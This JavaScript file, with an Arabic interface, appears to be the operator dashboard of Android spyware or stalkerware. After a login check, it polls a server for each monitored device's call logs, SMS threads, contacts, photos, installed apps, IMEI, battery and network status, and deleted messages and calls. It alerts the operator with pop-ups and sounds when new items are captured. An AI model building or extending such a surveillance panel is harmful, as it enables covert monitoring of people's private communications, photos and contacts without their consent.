if (sessionStorage.getItem('logged_in') !== 'true') {
    window.location.href = 'login.html';
}

let currentDevice = null;
let updateInterval = null;
let dataInterval = null;
let allCalls = [];
let allSMS = [];
let allContacts = [];
let allDeleted = [];
let currentChat = null;
let currentCallNumber = null;
let currentContact = null;
let wasOffline = true;
let lastCallCount = 0;
let lastSmsCount = 0;
let lastDeletedCount = 0;
let notificationShown = false;
let soundPlayedForDevice = false;

function logout() { sessionStorage.removeItem('logged_in'); window.location.href = 'login.html'; }
function playNotificationSound() { try { const audio = new Audio('v.wav'); audio.volume = 1.0; audio.play(); } catch (e) {} }

function findContactName(number) {
    if (!allContacts || allContacts.length === 0 || !number) return null;
    const cleanNumber = number.replace(/[^0-9]/g, '').slice(-9);
    for (let contact of allContacts) {
        const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
        for (let n of numbers) {
            if (!n) continue;
            if (n.replace(/[^0-9]/g, '').slice(-9) === cleanNumber) return contact.name;
        }
    }
    return null;
}

function showNotification(title, message, icon) {
    const div = document.createElement('div');
    div.className = 'notification-popup';
    div.innerHTML = `<div class="notification-icon">${icon}</div><div class="notification-content"><div class="notification-title">${title}</div><div class="notification-message">${message}</div></div><button class="notification-close" onclick="this.parentElement.remove()">✕</button>`;
    document.body.appendChild(div);
    playNotificationSound();
    setTimeout(() => { if (div.parentElement) div.remove(); }, 5000);
}

function checkNewSMS(newSMS) {
    if (!newSMS || newSMS.length === 0) return;
    if (lastSmsCount > 0 && newSMS.length > lastSmsCount) {
        const s = newSMS[0];
        showNotification('💬 رسالة جديدة', `${findContactName(s.address) || s.address}: ${s.body || ''}`, '💬');
        const badge = document.getElementById('smsCount');
        if (badge) {
            badge.textContent = `(${newSMS.length}) 🔴`;
            badge.className = 'count badge-new';
        }
    }
    lastSmsCount = newSMS.length;
}

function checkNewCalls(newCalls) {
    if (!newCalls || newCalls.length === 0) return;
    if (lastCallCount > 0 && newCalls.length > lastCallCount) {
        const c = newCalls[0];
        showNotification('📞 مكالمة جديدة', `${findContactName(c.number) || c.number} — ${getCallType(c.type)}`, '📞');
        const badge = document.getElementById('callCount');
        if (badge) {
            badge.textContent = `(${newCalls.length}) 🔴`;
            badge.className = 'count badge-new';
        }
    }
    lastCallCount = newCalls.length;
}

function checkNewDeleted(deleted) {
    if (!deleted || deleted.length === 0) return;
    if (lastDeletedCount > 0 && deleted.length > lastDeletedCount) {
        const d = deleted[0];
        const typeName = d.type === 'deleted_call' ? 'مكالمة محذوفة' : 'رسالة محذوفة';
        showNotification('🗑️ ' + typeName, 'تم اكتشاف عنصر محذوف', '🗑️');
        const badge = document.getElementById('deletedCount');
        if (badge) {
            badge.textContent = `(${deleted.length}) 🔴`;
            badge.className = 'count badge-new';
        }
    }
    lastDeletedCount = deleted.length;
}

// ✅ حذف الجهاز مع 5 محاولات إعادة تحميل
async function deleteDevice() {
    if (!currentDevice) { alert('⚠️ اختر جهازًا أولًا'); return; }
    if (!confirm('هل أنت متأكد من حذف هذا الجهاز؟')) return;
    
    try {
        const response = await fetch(`/api.php?action=delete_device&device=${encodeURIComponent(currentDevice)}`);
        const result = await response.json();
        
        if (result.success) {
            alert('✅ تم حذف الجهاز');
            currentDevice = null;
            document.getElementById('deviceSelect').value = '';
            document.getElementById('deviceNameDisplay').textContent = 'لا يوجد جهاز محدد';
            document.getElementById('deviceNameDisplay').className = 'device-name-display';
            
            // ✅ 5 محاولات
            setTimeout(() => { loadDevices(); }, 500);
            setTimeout(() => { loadDevices(); }, 1500);
            setTimeout(() => { loadDevices(); }, 3000);
            setTimeout(() => { loadDevices(); }, 5000);
            setTimeout(() => { loadDevices(); }, 8000);
        } else {
            alert('❌ خطأ: ' + (result.error || 'غير معروف'));
        }
    } catch (e) { alert('❌ خطأ في الاتصال: ' + e.message); }
}

async function loadDevices() {
    try {
        const response = await fetch('/devices.json');
        const devices = await response.json();
        
        const select = document.getElementById('deviceSelect');
        const currentValue = currentDevice;
        select.innerHTML = '<option value="">اختر الجهاز...</option>';
        
        devices.forEach(device => {
            const option = document.createElement('option');
            option.value = device.id;
            option.textContent = device.name || device.id;
            select.appendChild(option);
        });
        
        if (currentValue) { select.value = currentValue; }
        else if (devices.length > 0) { selectDevice(devices[0].id); select.value = devices[0].id; }
    } catch (e) {}
}

function selectDevice(deviceId) {
    currentDevice = deviceId;
    
    const display = document.getElementById('deviceNameDisplay');
    if (deviceId) {
        const select = document.getElementById('deviceSelect');
        const selectedOption = select.options[select.selectedIndex];
        const deviceName = selectedOption ? selectedOption.textContent : deviceId;
        display.textContent = `📱 ${deviceName}`;
        display.className = 'device-name-display active';
    } else {
        display.textContent = 'لا يوجد جهاز';
        display.className = 'device-name-display';
    }
    
    if (deviceId && !soundPlayedForDevice) {
        playNotificationSound();
        soundPlayedForDevice = true;
        setTimeout(() => { soundPlayedForDevice = false; }, 10000);
    }
    
    if (updateInterval) clearInterval(updateInterval);
    if (dataInterval) clearInterval(dataInterval);
    
    if (deviceId) {
        updateInterval = setInterval(updateLiveData, 5000);
        dataInterval = setInterval(() => { if (currentDevice) loadAllData(); }, 10000);
        updateLiveData();
        loadAllData();
    }
}

async function updateLiveData() {
    if (!currentDevice) return;
    try {
        const response = await fetch(`/live.php?device=${encodeURIComponent(currentDevice)}`);
        const data = await response.json();
        
        const statusEl = document.getElementById('networkStatus');
        if (data.online) { statusEl.textContent = data.network || 'متصل'; statusEl.className = 'value online'; }
        else { statusEl.textContent = 'غير متصل'; statusEl.className = 'value offline'; }
        
        if (data.battery !== null && data.battery !== undefined) document.getElementById('batteryStatus').textContent = data.battery + '%';
        if (data.call_count !== undefined) document.getElementById('callCount').textContent = `(${data.call_count})`;
        if (data.sms_count !== undefined) document.getElementById('smsCount').textContent = `(${data.sms_count})`;
        if (data.contacts_count !== undefined) document.getElementById('contactsCount').textContent = `(${data.contacts_count})`;
        if (data.images_count !== undefined) document.getElementById('imagesCount').textContent = `(${data.images_count})`;
        if (data.apps_count !== undefined) document.getElementById('appsCount').textContent = `(${data.apps_count})`;
        if (data.deleted_count !== undefined) document.getElementById('deletedCount').textContent = `(${data.deleted_count})`;
    } catch (e) {}
}

async function loadAllData() {
    if (!currentDevice) return;
    await loadCalls();
    await loadSMS();
    await loadContacts();
    await loadImages();
    await loadApps();
    await loadDeviceInfo();
    await loadDeleted();
}

async function loadDeleted() {
    try {
        const response = await fetch(`/api.php?action=get_deleted&device=${encodeURIComponent(currentDevice)}`);
        const deleted = await response.json();
        
        if (JSON.stringify(deleted) !== JSON.stringify(allDeleted)) {
            checkNewDeleted(deleted);
            allDeleted = deleted;
            displayDeleted();
        }
    } catch (e) {}
}

function displayDeleted() {
    const div = document.getElementById('deletedList');
    if (!div) return;
    
    div.innerHTML = '';
    
    if (!allDeleted || allDeleted.length === 0) {
        div.innerHTML = '<p style="color:#888;">لا توجد محذوفات</p>';
        return;
    }
    
    [...allDeleted].sort((a, b) => (b.deleted_at || 0) - (a.deleted_at || 0)).forEach(item => {
        const divItem = document.createElement('div');
        divItem.className = 'conversation-item';
        
        if (item.type === 'deleted_call') {
            divItem.innerHTML = `
                <div class="conversation-avatar">📞</div>
                <div class="conversation-info">
                    <div class="conversation-name">مكالمة محذوفة</div>
                    <div class="conversation-preview">الرقم: ${item.number || 'غير معروف'}</div>
                    <div class="conversation-preview">النوع: ${getCallType(item.call_type)} | المدة: ${formatDuration(item.duration)}</div>
                    <div class="conversation-preview">التاريخ: ${formatDate(item.date)}</div>
                </div>
                <div class="conversation-time">حذف: ${formatDate(item.deleted_at)}</div>
            `;
        } else {
            divItem.innerHTML = `
                <div class="conversation-avatar">💬</div>
                <div class="conversation-info">
                    <div class="conversation-name">رسالة محذوفة</div>
                    <div class="conversation-preview">المرسل: ${item.address || 'غير معروف'}</div>
                    <div class="conversation-preview">النص: ${item.body || ''}</div>
                    <div class="conversation-preview">التاريخ: ${formatDate(item.date)}</div>
                </div>
                <div class="conversation-time">حذف: ${formatDate(item.deleted_at)}</div>
            `;
        }
        
        div.appendChild(divItem);
    });
}

async function loadCalls() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=call_logs`);
        const newCalls = await response.json();
        if (JSON.stringify(newCalls) !== JSON.stringify(allCalls)) {
            checkNewCalls(newCalls);
            allCalls = newCalls;
            if (currentCallNumber) openCallDetail(currentCallNumber);
            else displayCallsList();
        }
    } catch (e) {}
}

function displayCallsList() {
    document.getElementById('callDetailView').style.display = 'none';
    document.getElementById('callsListView').style.display = 'block';
    const div = document.getElementById('callsListView');
    div.innerHTML = '';
    if (!allCalls || allCalls.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد مكالمات</p>'; return; }
    
    [...allCalls].sort((a, b) => (b.date || 0) - (a.date || 0)).forEach(call => {
        const displayName = call.name || findContactName(call.number) || call.number || 'غير معروف';
        const item = document.createElement('div');
        item.className = 'conversation-item';
        item.onclick = () => openCallDetail(call.number);
        item.innerHTML = `<div class="conversation-avatar">${call.type == 1 ? '📥' : call.type == 2 ? '📤' : '❌'}</div><div class="conversation-info"><div class="conversation-name">${displayName}</div><div class="conversation-preview">${formatDate(call.date)}</div></div><div class="conversation-time">${formatDuration(call.duration)}</div>`;
        div.appendChild(item);
    });
}

function openCallDetail(number) {
    currentCallNumber = number;
    document.getElementById('callsListView').style.display = 'none';
    document.getElementById('callDetailView').style.display = 'block';
    document.getElementById('callDetailTitle').textContent = `📞 ${findContactName(number) || number}`;
    const detailsDiv = document.getElementById('callDetailsList');
    detailsDiv.innerHTML = '';
    allCalls.filter(c => c.number === number).sort((a, b) => (b.date || 0) - (a.date || 0)).forEach(call => {
        const div = document.createElement('div');
        div.className = 'call-detail-item';
        div.innerHTML = `<span class="call-type type-${call.type}">${getCallType(call.type)}</span><span>⏱️ ${formatDuration(call.duration)}</span><span>📅 ${formatDate(call.date)}</span>`;
        detailsDiv.appendChild(div);
    });
}

function backToCallsList() { currentCallNumber = null; displayCallsList(); }

async function loadSMS() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=sms`);
        const newSMS = await response.json();
        if (JSON.stringify(newSMS) !== JSON.stringify(allSMS)) {
            checkNewSMS(newSMS);
            allSMS = newSMS;
            if (currentChat) openChat(currentChat);
            else displayConversations();
        }
    } catch (e) {}
}

function displayConversations() {
    document.getElementById('chatView').style.display = 'none';
    document.getElementById('conversationsList').style.display = 'block';
    const div = document.getElementById('conversationsList');
    div.innerHTML = '';
    if (!allSMS || allSMS.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد رسائل</p>'; return; }
    
    const sorted = [...allSMS].sort((a, b) => (b.date || 0) - (a.date || 0));
    const conversations = {};
    sorted.forEach(sms => { const n = sms.address || 'غير معروف'; if (!conversations[n]) conversations[n] = []; conversations[n].push(sms); });
    
    Object.keys(conversations).forEach(number => {
        const last = conversations[number][0];
        const displayName = findContactName(number) || number;
        const item = document.createElement('div');
        item.className = 'conversation-item';
        item.onclick = () => openChat(number);
        item.innerHTML = `<div class="conversation-avatar">💬</div><div class="conversation-info"><div class="conversation-name">${displayName}</div><div class="conversation-preview">${last.body || ''}</div></div><div class="conversation-time">${formatDate(last.date)}</div>`;
        div.appendChild(item);
    });
}

function openChat(number) {
    currentChat = number;
    document.getElementById('conversationsList').style.display = 'none';
    document.getElementById('chatView').style.display = 'block';
    document.getElementById('chatTitle').textContent = `💬 ${findContactName(number) || number}`;
    const messagesList = document.getElementById('messagesList');
    messagesList.innerHTML = '';
    allSMS.filter(s => s.address === number).sort((a, b) => (a.date || 0) - (b.date || 0)).forEach(sms => {
        const div = document.createElement('div');
        div.className = `message ${sms.type == 1 ? 'incoming' : 'outgoing'}`;
        div.innerHTML = `<div class="message-bubble"><div class="message-text">${sms.body || ''}</div><div class="message-time">${formatDate(sms.date)}</div></div>`;
        messagesList.appendChild(div);
    });
    messagesList.scrollTop = messagesList.scrollHeight;
}

function backToConversations() { currentChat = null; displayConversations(); }

async function loadContacts() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=contacts`);
        const newContacts = await response.json();
        if (JSON.stringify(newContacts) !== JSON.stringify(allContacts)) {
            allContacts = newContacts;
            if (currentContact) openContactDetail(currentContact);
            else displayContactsList();
        }
    } catch (e) {}
}

function displayContactsList() {
    document.getElementById('contactDetailView').style.display = 'none';
    document.getElementById('contactsListView').style.display = 'block';
    const div = document.getElementById('contactsListView');
    div.innerHTML = '';
    if (!allContacts || allContacts.length === 0) { div.innerHTML = '<p style="color:#888;">لا توجد جهات</p>'; return; }
    
    [...allContacts].sort((a, b) => (a.name || '').localeCompare(b.name || '', 'ar')).forEach(contact => {
        const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
        const item = document.createElement('div');
        item.className = 'conversation-item';
        item.onclick = () => openContactDetail(contact.name);
        item.innerHTML = `<div class="conversation-avatar">👤</div><div class="conversation-info"><div class="conversation-name">${contact.name || 'بدون اسم'}</div><div class="conversation-preview">${numbers.join(', ')}</div></div>`;
        div.appendChild(item);
    });
}

function openContactDetail(name) {
    currentContact = name;
    document.getElementById('contactsListView').style.display = 'none';
    document.getElementById('contactDetailView').style.display = 'block';
    const contact = allContacts.find(c => c.name === name);
    if (!contact) return;
    const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
    document.getElementById('contactDetails').innerHTML = `<div class="contact-detail-card"><div class="contact-avatar">👤</div><h4>${contact.name}</h4><div class="contact-numbers">${numbers.map(n => `<div class="contact-number-item"><span>${n}</span><div><button class="action-btn" onclick="openChat('${n}')">💬</button><button class="action-btn" onclick="openCallDetail('${n}')">📞</button></div></div>`).join('')}</div></div>`;
}

function backToContactsList() { currentContact = null; displayContactsList(); }

async function loadImages() {
    try {
        const response = await fetch(`/api.php?action=get_image_data&device=${encodeURIComponent(currentDevice)}`);
        const images = await response.json();
        const grid = document.getElementById('imagesGrid');
        grid.innerHTML = '';
        if (!images || images.length === 0) { grid.innerHTML = '<p style="color:#888;">لا توجد صور</p>'; return; }
        
        [...images].sort((a, b) => (b.date || 0) - (a.date || 0)).forEach((image, i) => {
            const div = document.createElement('div');
            div.className = 'image-card';
            const img = document.createElement('img');
            if (image.data) { let m = 'image/jpeg'; if (image.name) { const e = image.name.toLowerCase().split('.').pop(); if (e === 'png') m = 'image/png'; } img.src = `data:${m};base64,${image.data}`; }
            img.className = 'thumb';
            const name = document.createElement('div'); name.className = 'image-name'; name.textContent = image.name || `صورة ${i+1}`;
            const btns = document.createElement('div'); btns.className = 'image-buttons';
            const v = document.createElement('button'); v.className = 'view-btn'; v.textContent = '👁️'; v.onclick = () => window.open(img.src);
            const d = document.createElement('button'); d.className = 'download-btn'; d.textContent = '⬇️'; d.onclick = () => { const a = document.createElement('a'); a.href = img.src; a.download = image.name; document.body.appendChild(a); a.click(); a.remove(); };
            btns.appendChild(v); btns.appendChild(d);
            div.appendChild(img); div.appendChild(name); div.appendChild(btns);
            grid.appendChild(div);
        });
    } catch (e) {}
}

async function loadApps() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=installed_apps`);
        const apps = await response.json();
        const tbody = document.querySelector('#appsTable tbody');
        tbody.innerHTML = '';
        if (!apps || apps.length === 0) return;
        apps.forEach(app => { const r = document.createElement('tr'); r.innerHTML = `<td>${app.name || app.package}</td><td>${app.package}</td><td>${app.system_app ? 'نعم' : 'لا'}</td>`; tbody.appendChild(r); });
    } catch (e) {}
}

async function loadDeviceInfo() {
    try {
        const response = await fetch(`/api.php?action=get_data&device=${encodeURIComponent(currentDevice)}&type=device_info`);
        const info = await response.json();
        const div = document.getElementById('deviceInfo');
        if (!info || Object.keys(info).length === 0) return;
        div.innerHTML = `<div class="device-info-grid"><div class="info-card"><span>الموديل:</span><strong>${info.model || '—'}</strong></div><div class="info-card"><span>العلامة:</span><strong>${info.brand || '—'}</strong></div><div class="info-card"><span>النظام:</span><strong>${info.os_version || '—'}</strong></div><div class="info-card"><span>IMEI:</span><strong>${info.imei || '—'}</strong></div></div>`;
    } catch (e) {}
}

function switchTab(tabName) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
    const tab = document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`);
    if (tab) tab.classList.add('active');
    const pane = document.getElementById(`${tabName}Tab`);
    if (pane) pane.classList.add('active');
}

function formatDuration(s) { if (!s || s < 0) return '0:00'; return `${Math.floor(s/60)}:${(s%60).toString().padStart(2,'0')}`; }
function formatDate(t) { if (!t) return '—'; try { return new Date(t).toLocaleString('ar'); } catch (e) { return '—'; } }
function getCallType(t) { switch(parseInt(t)) { case 1: return '📥 وارد'; case 2: return '📤 صادر'; case 3: return '❌ فائت'; default: return 'غير معروف'; } }

loadDevices();
setInterval(loadDevices, 10000);
